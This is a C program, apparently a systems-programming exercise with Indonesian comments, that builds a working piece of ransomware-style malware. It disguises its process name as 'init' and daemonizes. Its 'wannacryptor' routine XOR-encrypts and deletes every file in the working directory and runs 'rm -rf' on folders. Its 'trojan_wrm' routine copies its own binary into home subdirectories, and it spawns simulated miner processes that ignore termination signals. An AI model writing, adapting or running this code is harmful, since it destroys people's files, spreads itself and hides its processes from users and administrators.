#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <ftw.h>
#include <sys/prctl.h>
#include <time.h>
#include <signal.h>

#define MAX_PATH 1024
#define MAX_MINERS 5 
#define LOGFILE "/tmp/.miner.log"
char *self_path;

void daemonize() {
    pid_t pid = fork();

    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent keluar

    if (setsid() < 0) exit(EXIT_FAILURE);

    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent keluar

    umask(0);
    chdir("/");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, "/init", 0, 0, 0);

}


// Cek apakah path = direktori
int is_directory(const char *path) {
    struct stat statbuf;
    stat(path, &statbuf);
    return S_ISDIR(statbuf.st_mode);
}

// Fungsi untuk mengenkripsi file dengan XOR menggunakan timestamp sebagai key
void encrypt_file(const char *filepath, unsigned char key) {
    FILE *in = fopen(filepath, "rb");
    if (!in) return;

    char encrypted_name[MAX_PATH];
    snprintf(encrypted_name, sizeof(encrypted_name), "%s.enc", filepath);
    FILE *out = fopen(encrypted_name, "wb");
    if (!out) {
        fclose(in);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filepath);

}

// Hapus folder beserta isinya (menggunakan command sistem)
void remove_folder(const char *folder) {
    char cmd[MAX_PATH];
    snprintf(cmd, sizeof(cmd), "rm -rf \"%s\"", folder);
    system(cmd);
}

// Fungsi utama wannacryptor (ZIP method)
void wannacryptor() {
    unsigned char key = (unsigned char)(time(NULL) % 256);

    DIR *d = opendir(".");
    struct dirent *dir;

    while ((dir = readdir(d)) != NULL) {
        if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;

        if (is_directory(dir->d_name)) {
            // Kompres folder jadi zip
            char zip_cmd[MAX_PATH];
            snprintf(zip_cmd, sizeof(zip_cmd), "zip -r \"%s.zip\" \"%s\" > /dev/null", dir->d_name, dir->d_name);
            system(zip_cmd);

            // Enkripsi zip file
            char zip_path[MAX_PATH];
            snprintf(zip_path, sizeof(zip_path), "%s.zip", dir->d_name);
            encrypt_file(zip_path, key);

            // Hapus folder dan file zip-nya
            remove_folder(dir->d_name);
            remove(zip_path);  
        } else {
            if (strstr(dir->d_name, ".enc") != NULL) continue;

            encrypt_file(dir->d_name, key);
            remove(dir->d_name); 
        }
    }

    closedir(d);

    while (1) sleep(60);  // Tetap hidup agar terlihat di ps
}


void trojan_wrm() {
    const char *home = getenv("HOME");
    if (!home) return;

    DIR *d = opendir(home);
    if (!d) return;

    char self[512];
    readlink("/proc/self/exe", self, sizeof(self));

    struct dirent *ent;
    while ((ent = readdir(d))) {
        if (ent->d_type != DT_DIR || !strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")) continue;

        char target[512];
        snprintf(target, sizeof(target), "%s/%s/trojan.wrm", home, ent->d_name);

        pid_t pid = fork();
        if (pid == 0) {
            prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0); // pastikan namanya jelas
            sleep(30); // supaya muncul di ps selama 30 detik
            execl("/bin/cp", "cp", self, target, NULL);
            exit(1); // keluar kalau gagal
        }
    }

    closedir(d);
}

void generate_random_hash(char *output, size_t length) {
    static const char charset[] = "0123456789abcdef";
    for (size_t i = 0; i < length; i++) {
        output[i] = charset[rand() % 16];
    }
    output[length] = '\0';
}

void miner_process(int id) {
    char name[64];
    snprintf(name, sizeof(name), "mine-crafter-%d", id);
    prctl(PR_SET_NAME, name, 0, 0, 0);

    srand(time(NULL) ^ (getpid() << 16));

    while (1) {
        char hash[65];
        generate_random_hash(hash, 64);

        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char time_str[64];
        strftime(time_str, sizeof(time_str), "[%Y-%m-%d %H:%M:%S]", t);

        FILE *log = fopen(LOGFILE, "a");
        if (log) {
            fprintf(log, "%s[Miner %02d] %s\n", time_str, id, hash);
            fclose(log);
        }

        int delay = 3 + rand() % 28;
        sleep(delay);
    }
}

void rodok_forkbomb() {
    prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);

    for (int i = 0; i < MAX_MINERS; ++i) {
        pid_t pid = fork();
        if (pid == 0) {
            char name[64];
            snprintf(name, sizeof(name), "mine-crafter-%d", i);
            char *argv_fake[] = { name, NULL };
            execv(self_path, argv_fake);
            exit(1); // Fallback
        }
    }

    signal(SIGTERM, SIG_IGN);
    pause(); // Tunggu dibunuh
}


int main(int argc, char *argv[]) {
    strncpy(argv[0], "init", strlen(argv[0]));
    memset(argv[0] + 4, '\0', strlen(argv[0]) - 4); 

    // Ubah nama proses jadi /init
    prctl(PR_SET_NAME, "init", 0, 0, 0);

    if (strstr(argv[0], "mine-crafter-") != NULL) {
        int id = atoi(strrchr(argv[0], '-') + 1); // ambil ID dari nama
        miner_process(id);
        return 0;
    }
    
    daemonize();

    pid_t pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
        wannacryptor();
        exit(0);
    }

    pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
        trojan_wrm();
        exit(0);
    }

    pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
        rodok_forkbomb(); 
        exit(0);
    }

    // Proses daemon utama stay idle
    while (1) sleep(60);
    return 0;
}
